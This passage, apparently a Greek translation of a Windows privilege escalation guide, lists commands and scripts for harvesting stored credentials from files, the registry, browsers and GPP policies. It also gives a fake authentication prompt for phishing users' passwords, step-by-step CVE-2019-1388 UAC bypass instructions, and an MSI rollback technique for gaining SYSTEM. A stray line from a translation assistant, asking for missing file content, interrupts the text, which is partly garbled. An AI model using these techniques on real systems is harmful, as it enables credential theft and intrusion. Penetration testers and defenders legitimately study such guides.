Περισσότερες πληροφορίες για αυτή την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα στο boot, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Φαίνεται ότι αυτή η technique δεν είναι πλέον valid. Προσπάθησα να δημιουργήσω κάποια ssh keys, να τα προσθέσω με `ssh-add` και να κάνω login via ssh σε ένα machine. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά τη διάρκεια της asymmetric key authentication.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Αντίγραφα ασφαλείας SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζήτησε ένα αρχείο με όνομα **SiteList.xml**

### Cached GPP Pasword

Μια λειτουργία ήταν προηγουμένως διαθέσιμη που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανών μέσω Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά κενά ασφάλειας. Πρώτον, τα Group Policy Objects (GPOs), αποθηκευμένα ως XML αρχεία στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε domain user. Δεύτερον, οι passwords μέσα σε αυτά τα GPPs, κρυπτογραφημένες με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο default key, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε authenticated user. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς θα μπορούσε να επιτρέψει σε χρήστες να αποκτήσουν elevated privileges.

Για να μετριαστεί αυτός ο κίνδυνος, αναπτύχθηκε μια function για σάρωση τοπικά cached GPP αρχεία που περιέχουν πεδίο "cpassword" το οποίο δεν είναι κενό. Μόλις βρεθεί τέτοιο αρχείο, η function αποκρυπτογραφεί τον password και επιστρέφει ένα προσαρμοσμένο PowerShell object. Αυτό το object περιλαμβάνει λεπτομέρειες για το GPP και τη θέση του αρχείου, βοηθώντας στον εντοπισμό και τη διόρθωση αυτής της ευπάθειας ασφάλειας.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρησιμοποιώντας crackmapexec για να αποκτήσετε τους κωδικούς πρόσβασης:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα web.config με credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### διαπιστευτήρια OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισαγάγει τα διαπιστευτήριά του ή ακόμα και τα διαπιστευτήρια ενός διαφορετικού χρήστη** αν νομίζετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι το να **ζητήσετε** απευθείας από τον πελάτη τα **διαπιστευτήρια** είναι πραγματικά **ριψοκίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά filenames που περιέχουν credentials**

Γνωστά files που κάποτε περιείχαν **passwords** σε **clear-text** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Δεν δόθηκε το περιεχόμενο των προτεινόμενων αρχείων για μετάφραση. Παρακαλώ στείλε το κείμενο/το markdown του `src/windows-hardening/windows-local-privilege-escalation/README.md` για να το μεταφράσω στα Ελληνικά διατηρώντας ακριβώς τη σύνταξη markdown/html.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στο RecycleBin

Θα πρέπει επίσης να ελέγξετε το Bin για να αναζητήσετε διαπιστευτήρια μέσα σε αυτό

Για να **ανακτήσετε passwords** που έχουν αποθηκευτεί από διάφορα προγράμματα μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο registry

**Άλλα πιθανά registry keys με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Εξαγωγή openssh keys από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

Θα πρέπει να ελέγξετε για dbs όπου αποθηκεύονται passwords από **Chrome ή Firefox**.\
Επίσης ελέγξτε το history, τα bookmarks και τα favourites των browsers, ώστε ίσως κάποια **passwords are** να είναι αποθηκευμένα εκεί.

Tools για εξαγωγή passwords από browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Το **Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows που επιτρέπει **intercommunication** μεταξύ software components διαφορετικών γλωσσών. Κάθε COM component **αναγνωρίζεται μέσω ενός class ID (CLSID)** και κάθε component εκθέτει functionality μέσω ενός ή περισσότερων interfaces, που αναγνωρίζονται μέσω interface IDs (IIDs).

Τα COM classes και interfaces ορίζονται στο registry κάτω από **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface** αντίστοιχα. Αυτό το registry δημιουργείται με συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSIDs αυτού του registry μπορείτε να βρείτε το child registry **InProcServer32** το οποίο περιέχει μια **default value** που δείχνει σε ένα **DLL** και μια τιμή με όνομα **ThreadingModel** που μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ή **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Βασικά, αν μπορείτε να **overwrite any of the DLLs** που πρόκειται να εκτελεστούν, μπορείτε να **escalate privileges** αν αυτό το DLL πρόκειται να εκτελεστεί από διαφορετικό user.

Για να μάθετε πώς οι attackers χρησιμοποιούν το COM Hijacking ως μηχανισμό persistence δείτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Αναζήτηση για περιεχόμενα αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση για αρχείο με συγκεκριμένο όνομα**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζήτηση στο registry για ονόματα κλειδιών και passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Φανταστείτε ότι **μια διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) **με πλήρη πρόσβαση**. Η ίδια διεργασία **επίσης δημιουργεί μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά privileges αλλά κληρονομώντας όλα τα open handles της κύριας διεργασίας**.\
Τότε, αν έχετε **πλήρη πρόσβαση στη low privileged process**, μπορείτε να πάρετε το **open handle προς την privileged process που δημιουργήθηκε** με `OpenProcess()` και να **inject ένα shellcode**.\
[Διαβάστε αυτό το example για περισσότερες πληροφορίες σχετικά με το **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτό το **other post για μια πιο πλήρη εξήγηση σχετικά με το how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα shared memory segments, που αναφέρονται ως **pipes**, επιτρέπουν την επικοινωνία διεργασιών και τη μεταφορά δεδομένων.

Το Windows παρέχει μια δυνατότητα που ονομάζεται **Named Pipes**, επιτρέποντας σε ασύνδετες διεργασίες να μοιράζονται δεδομένα, ακόμα και σε διαφορετικά networks. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους που ορίζονται ως **named pipe server** και **named pipe client**.

Όταν δεδομένα αποστέλλονται μέσω ενός pipe από έναν **client**, ο **server** που έστησε το pipe έχει τη δυνατότητα να **αναλάβει την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα **SeImpersonate** rights. Ο εντοπισμός μιας **privileged process** που επικοινωνεί μέσω ενός pipe που μπορείτε να μιμηθείτε παρέχει την ευκαιρία να **αποκτήσετε υψηλότερα privileges** υιοθετώντας την ταυτότητα αυτής της διεργασίας μόλις αλληλεπιδράσει με το pipe που δημιουργήσατε. Για οδηγίες σχετικά με την εκτέλεση μιας τέτοιας attack, χρήσιμοι οδηγοί μπορείτε να βρείτε [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης το ακόλουθο tool επιτρέπει να **intercept μια named pipe communication με ένα tool όπως το burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το tool επιτρέπει να listar και να βλέπετε όλα τα pipes για να βρείτε privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Η Telephony service (TapiSrv) σε server mode εκθέτει το `\\pipe\\tapsrv` (MS-TRP). Ένας remote authenticated client μπορεί να abuse το mailslot-based async event path για να μετατρέψει το `ClientAttach` σε ένα arbitrary **4-byte write** σε οποιοδήποτε υπάρχον file εγγράψιμο από το `NETWORK SERVICE`, και μετά να αποκτήσει Telephony admin rights και να φορτώσει ένα arbitrary DLL ως η υπηρεσία. Πλήρης flow:

- `ClientAttach` με `pszDomainUser` ρυθμισμένο σε ένα εγγράψιμο υπάρχον path → η υπηρεσία το ανοίγει μέσω `CreateFileW(..., OPEN_EXISTING)` και το χρησιμοποιεί για async event writes.
- Κάθε event γράφει το attacker-controlled `InitContext` από το `Initialize` σε εκείνο το handle. Register a line app με `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch μέσω `GetAsyncEvents` (`Req_Func 0`), μετά unregister/shutdown για να επαναλάβετε deterministic writes.
- Προσθέστε τον εαυτό σας στο `[TapiAdministrators]` στο `C:\Windows\TAPI\tsec.ini`, reconnect, και μετά καλέστε `GetUIDllName` με ένα arbitrary DLL path για να εκτελέσετε το `TSPI_providerUIIdentify` ως `NETWORK SERVICE`.

Περισσότερες λεπτομέρειες:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Τα clickable Markdown links που προωθούνται στο `ShellExecuteExW` μπορούν να ενεργοποιήσουν επικίνδυνα URI handlers (`file:`, `ms-appinstaller:` ή οποιοδήποτε registered scheme) και να εκτελέσουν αρχεία υπό τον έλεγχο του attacker ως ο τρέχων χρήστης. Δείτε:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Όταν αποκτάτε ένα shell ως χρήστης, μπορεί να υπάρχουν scheduled tasks ή άλλες διεργασίες που εκτελούνται και **περνούν credentials στη command line**. Το script παρακάτω καταγράφει command lines διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας τυχόν διαφορές.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Κλοπή κωδικών πρόσβασης από διεργασίες

## Από Low Priv User σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στο γραφικό περιβάλλον (μέσω console ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις του Microsoft Windows είναι δυνατό να εκτελέσετε ένα terminal ή οποιαδήποτε άλλη διεργασία ως "NT\AUTHORITY SYSTEM" από έναν μη προνομιούχο χρήστη.

Αυτό καθιστά δυνατό το privilege escalation και το bypass του UAC ταυτόχρονα με το ίδιο vulnerability. Επιπλέον, δεν χρειάζεται να εγκαταστήσετε τίποτα και το binary που χρησιμοποιείται κατά τη διάρκεια της διαδικασίας είναι signed και issued by Microsoft.

Μερικά από τα affected systems είναι τα ακόλουθα:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να εκμεταλλευτείς αυτή την ευπάθεια, είναι απαραίτητο να εκτελέσεις τα ακόλουθα βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διάβασε αυτό για να **μάθεις για τα Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Έπειτα **διάβασε αυτό για να μάθεις για το UAC και τα UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Από Arbitrary Folder Delete/Move/Rename σε SYSTEM EoP

Η τεχνική που περιγράφεται [**σε αυτό το blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) με exploit code [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Η επίθεση βασικά συνίσταται στην κατάχρηση του rollback feature του Windows Installer για να αντικαταστήσει νόμιμα αρχεία με κακόβουλα κατά την διαδικασία της απεγκατάστασης. Για αυτό ο attacker χρειάζεται να δημιουργήσει ένα **κακόβουλο MSI installer** που θα χρησιμοποιηθεί για να hijack το `C:\Config.Msi` folder, το οποίο αργότερα θα χρησιμοποιηθεί από το Windows Installer για να αποθηκεύσει rollback files κατά την απεγκατάσταση άλλων MSI packages, όπου τα rollback files θα έχουν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

Η συνοπτική τεχνική είναι η εξής:

1. **Stage 1 – Προετοιμασία για το Hijack (άφησε το `C:\Config.Msi` άδειο)**

- Βήμα 1: Εγκατάσταση του MSI
- Δημιούργησε ένα `.msi` που εγκαθιστά ένα αβλαβές αρχείο (π.χ. `dummy.txt`) σε έναν writable folder (`TARGETDIR`).
- Σήμανε τον installer ως **"UAC Compliant"**, ώστε να μπορεί να τον εκτελέσει ένας **non-admin user**.
- Κράτησε ανοιχτό ένα **handle** στο αρχείο μετά την εγκατάσταση.

- Βήμα 2: Ξεκίνα την Απεγκατάσταση
- Απεγκατέστησε το ίδιο `.msi`.
- Η διαδικασία uninstall ξεκινά να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε `.rbf` files (rollback backups).
- **Poll το open file handle** χρησιμοποιώντας `GetFinalPathNameByHandle` για να εντοπίσεις πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Βήμα 3: Custom Syncing
- Το `.msi` περιλαμβάνει ένα **custom uninstall action (`SyncOnRbfWritten`)** που:
- Σηματοδοτεί όταν το `.rbf` έχει γραφτεί.
- Έπειτα **περιμένει** σε ένα άλλο event πριν συνεχίσει η απεγκατάσταση.

- Βήμα 4: Μπλόκαρε τη Διαγραφή του `.rbf`
- Όταν δοθεί το signal, **άνοιξε το `.rbf` file** χωρίς `FILE_SHARE_DELETE` — αυτό **αποτρέπει τη διαγραφή του**.
- Έπειτα **συντόνισε πίσω** ώστε η απεγκατάσταση να ολοκληρωθεί.
- Το Windows Installer αποτυγχάνει να διαγράψει το `.rbf`, και επειδή δεν μπορεί να διαγράψει όλο το περιεχόμενο, το **`C:\Config.Msi` δεν αφαιρείται**.

- Βήμα 5: Διέγραψε Μηχανικά το `.rbf`
- Εσύ (attacker) διαγράφεις χειροκίνητα το `.rbf` file.
- Τώρα το **`C:\Config.Msi` είναι άδειο**, έτοιμο να hijacked.

> Σε αυτό το σημείο, **ενεργοποίησε το SYSTEM-level arbitrary folder delete vulnerability** για να διαγράψεις το `C:\Config.Msi`.

2. **Stage 2 – Αντικατάσταση των Rollback Scripts με Κακόβουλα**

- Βήμα 6: Δημιούργησε ξανά το `C:\Config.Msi` με Weak ACLs
- Δημιούργησε ξανά το `C:\Config.Msi` folder μόνος σου.
- Όρισε **weak DACLs** (π.χ. Everyone:F), και **κράτα ανοιχτό ένα handle** με `WRITE_DAC`.

- Βήμα 7: Εκτέλεσε Άλλη Εγκατάσταση
- Εγκατάστησε ξανά το `.msi`, με:
- `TARGETDIR`: Writable location.
- `ERROROUT`: Μια variable που ενεργοποιεί forced failure.
- Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, το οποίο διαβάζει `.rbs` και `.rbf`.

- Βήμα 8: Παρακολούθησε για `.rbs`
- Χρησιμοποίησε `ReadDirectoryChangesW` για να παρακολουθείς το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
- Κατέγραψε το filename του.

- Βήμα 9: Sync πριν το Rollback
- Το `.msi` περιέχει ένα **custom install action (`SyncBeforeRollback`)** που:
- Σηματοδοτεί ένα event όταν δημιουργηθεί το `.rbs`.
- Έπειτα **περιμένει** πριν συνεχίσει.

- Βήμα 10: Εφαρμογή Weak ACL ξανά
- Αφού λάβεις το event `rbs created`:
- Το Windows Installer **εφαρμόζει ξανά strong ACLs** στο `C:\Config.Msi`.
- Όμως επειδή εξακολουθείς να έχεις ένα handle με `WRITE_DAC`, μπορείς να **εφαρμόσεις ξανά weak ACLs**.

> Τα ACLs **επιβάλλονται μόνο κατά το open του handle**, οπότε μπορείς ακόμα να γράψεις στο folder.

- Βήμα 11: Ρίξε Fake `.rbs` και `.rbf`
- Αντικατάστησε το `.rbs` file με ένα **fake rollback script** που λέει στα Windows να:
- Επαναφέρει το `.rbf` file σου (malicious DLL) σε ένα **privileged location** (π.χ. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Ρίξει το fake `.rbf` σου που περιέχει ένα **κακόβουλο SYSTEM-level payload DLL**.

- Βήμα 12: Ενεργοποίησε το Rollback
- Στείλε signal στο sync event ώστε ο installer να συνεχίσει.
- Ένα **type 19 custom action (`ErrorOut`)** είναι ρυθμισμένο να **αποτύχει σκόπιμα την εγκατάσταση** σε ένα γνωστό σημείο.
- Αυτό προκαλεί την έναρξη του **rollback**.

- Βήμα 13: Το SYSTEM Εγκαθιστά το DLL σου
- Το Windows Installer:
- Διαβάζει το κακόβουλο `.rbs` σου.
- Αντιγράφει το `.rbf` DLL σου στο target location.
- Τώρα έχεις το **κακόβουλο DLL σου σε ένα SYSTEM-loaded path**.

- Τελικό Βήμα: Εκτέλεση SYSTEM Code
- Εκτέλεσε ένα trusted **auto-elevated binary** (π.χ. `osk.exe`) που φορτώνει το DLL που hijacked.
- **Boom**: Ο code σου εκτελείται **ως SYSTEM**.


### Από Arbitrary File Delete/Move/Rename σε SYSTEM EoP

Η κύρια MSI rollback τεχνική (η προηγούμενη) υποθέτει ότι μπορείς να διαγράψεις ένα **ολόκληρο folder** (π.χ. `C:\Config.Msi`). Αλλά τι γίνεται αν η ευπάθειά σου επιτρέπει μόνο **arbitrary file deletion** ?

Θα μπορούσες να εκμεταλλευτείς τα **NTFS internals**: κάθε folder έχει ένα κρυφό alternate data stream που ονομάζεται:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Αυτό το stream αποθηκεύει τα **index metadata** του folder.

Άρα, αν **διαγράψεις το `::$INDEX_ALLOCATION` stream** ενός folder, το NTFS **αφαιρεί ολόκληρο το folder** από το filesystem.

Μπορείς να το κάνεις αυτό χρησιμοποιώντας standard file deletion APIs όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ακόμα κι αν καλείς ένα *file* delete API, αυτό **διαγράφει το ίδιο το folder**.

### Από Folder Contents Delete σε SYSTEM EoP
Τι γίνεται αν το primitive σου δεν επιτρέπει να διαγράψεις αυθαίρετα files/folders, αλλά **επιτρέπει τη διαγραφή του *contents* ενός folder που ελέγχεται από attacker**;

1. Step 1: Setup ένα bait folder και file
- Create: `C:\temp\folder1`
- Μέσα του: `C:\temp\folder1\file1.txt`

2. Step 2: Τοποθέτησε ένα **oplock** στο `file1.txt`
- Το oplock **pauses execution** όταν ένα privileged process προσπαθεί να διαγράψει το `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Βήμα 3: Ενεργοποίησε τη SYSTEM process (π.χ. `SilentCleanup`)
- Αυτή η process σαρώνει folders (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, το **oplock ενεργοποιείται** και παραδίδει τον έλεγχο στο callback σου.

4. Βήμα 4: Μέσα στο oplock callback – ανακατεύθυνε τη διαγραφή

- Option A: Μετακίνησε το `file1.txt` αλλού
- Αυτό αδειάζει το `folder1` χωρίς να σπάσει το oplock.
